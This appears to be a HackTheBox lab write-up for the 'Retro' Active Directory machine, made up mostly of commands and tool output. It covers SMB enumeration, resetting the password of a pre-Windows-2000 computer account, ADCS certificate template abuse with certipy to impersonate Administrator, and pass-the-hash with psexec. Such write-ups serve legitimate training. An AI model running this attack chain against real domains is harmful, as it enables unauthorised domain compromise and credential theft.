---
title: Retro - Active Directory
date: 2024-12-21 00:00:00 +0000
categories: [HackTheBox Writeups]
tags: [hackthebox, windows]
---

```
ares@legion:~/Documents$ sudo nmap -sVC -A -T4 --min-rate 1000 10.129.234.44
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 14:18 EST
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 8.33% done; ETC: 14:19 (0:01:06 remaining)
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 16.67% done; ETC: 14:18 (0:00:30 remaining)
Nmap scan report for 10.129.234.44 (10.129.234.44)
Host is up (0.055s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 19:18:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-11-25T18:54:12
|_Not valid after:  2026-11-25T18:54:12
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-11-25T18:54:12
|_Not valid after:  2026-11-25T18:54:12
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-11-25T18:54:12
|_Not valid after:  2026-11-25T18:54:12
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-11-25T18:54:12
|_Not valid after:  2026-11-25T18:54:12
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-25T19:19:55+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-25T19:19:15+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-11-24T19:03:21
|_Not valid after:  2026-05-26T19:03:21
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-25T19:19:17
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   55.20 ms 10.10.14.1 (10.10.14.1)
2   55.26 ms 10.129.234.44 (10.129.234.44)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.77 seconds
```


```
ares@legion:~/HackTheBox/Retro$ netexec smb $target -u 'guest' -p '' --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin                                                                                            
SMB         10.129.234.44   445    DC               C$                              Default share                                                                                           
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share                                                                                      
SMB         10.129.234.44   445    DC               Notes                           
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share                                                                                      
SMB         10.129.234.44   445    DC               Trainees        READ            
```
  
```
ares@legion:~/HackTheBox/Retro$ netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=. EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON' EXCLUDE_EXTS='lnk','ini','ico'
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SPIDER_PLUS 10.129.234.44   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.234.44   445    DC               [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.129.234.44   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.234.44   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$', 'sysvol', 'netlogon']
SPIDER_PLUS 10.129.234.44   445    DC               [*]   EXCLUDE_EXTS: ['lnk', 'ini', 'ico']
SPIDER_PLUS 10.129.234.44   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.234.44   445    DC               [*]  OUTPUT_FOLDER: .
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.44   445    DC               Notes                           
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ            
SPIDER_PLUS 10.129.234.44   445    DC               [+] Saved share-file metadata to "./10.129.234.44.json".
SPIDER_PLUS 10.129.234.44   445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Notes, SYSVOL, Trainees)
SPIDER_PLUS 10.129.234.44   445    DC               [*] SMB Readable Shares:  2 (IPC$, Trainees)
SPIDER_PLUS 10.129.234.44   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.234.44   445    DC               [*] Total folders found:  0
SPIDER_PLUS 10.129.234.44   445    DC               [*] Total files found:    0
```

```
ares@legion:~/HackTheBox/Retro$ ls
10.129.234.44.json

ares@legion:~/HackTheBox/Retro$ cat 10.129.234.44.json 
{
    "Trainees": {}
}                                                                                                                            
ares@legion:~/HackTheBox/Retro$ smbclient //$target/"Trainees" -U guest   
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Important.txt of size 288 as Important.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
smb: \> exit

ares@legion:~/HackTheBox/Retro$ cat Important.txt     
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins  
```

```
ares@legion:~/HackTheBox/Retro$ cat ToDo.txt     
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James  

```
trainee/trainee

```
ares@legion:~/HackTheBox/Retro$ netexec smb $target -u 'guest' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee userlist2.txt
Administrator
Guest
krbtgt
DC$
trainee
BANKING$
jburley
tblack

```
https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers
BANKING$/banking

Change password
```
ares@legion:~/HackTheBox/Retro$ impacket-changepasswd retro.vl/'banking$':banking@$target -newpass 'beer1!' -p rpc-samr
```
![20251125222237.png](/assets/img/htb-writeups/Pasted image 20251125222237.png)

Validate password change
```
ares@legion:~/HackTheBox/Retro$ crackmapexec smb $target -u 'banking$' -p 'beer1!'
```

More enum with valid logon creds
```
ares@legion:~/HackTheBox/Retro$ nxc ldap $target -u "banking$" -p 'beer1!' -M adcs

LDAP        10.129.47.169   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl)
LDAP        10.129.47.169   389    DC               [+] retro.vl\banking$:beer1! 
ADCS        10.129.47.169   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.47.169   389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.129.47.169   389    DC               Found CN: retro-DC-CA

```

```
certipy-ad find -u 'banking$' -p 'beer1!' -dc-ip $target -vulnerable -stdout
```
![20251125223431.png](/assets/img/htb-writeups/Pasted image 20251125223431.png)

The CA Name , Template Name and the Minimum RSA Key Length from the Certipy output should be
noted. Using these, a new certificate should be requested from the RetroClients template, impersonating
the Administrator user
(no sid)
```
ares@legion:~/HackTheBox/Retro$ certipy-ad req -u 'banking$' -p 'beer1!' -dc-ip $target -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -key-size 4096
```

Misssing SID on authentification:
```
ares@legion:~/HackTheBox/Retro$ certipy-ad auth -pfx 'administrator.pfx' -username 'Administrator' -domain 'retro.vl' -dc-ip $target
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@retro.vl'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] See the wiki for more information
```

Find SID:
```
ares@legion:~/HackTheBox/Retro$ certipy-ad account -u 'banking$' -p 'beer1!' -dc-ip $target -user 'administrator' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=retro,DC=vl
    name                                : Administrator
    objectSid                           : S-1-5-21-2983547755-698260136-4283918172-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2023-07-23T21:07:55+00:00
    whenChanged                         : 2025-05-05T07:11:09+00:00
```

```
certipy-ad req -u 'banking$' -p 'beer1!' -dc-ip $target -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500  -key-size 4096
```

![20251125225107.png](/assets/img/htb-writeups/Pasted image 20251125225107.png)

```
impacket-psexec retro.vl/Administrator@$target -hashes :252fac7066d93dd009d4fd2cd0368389
```



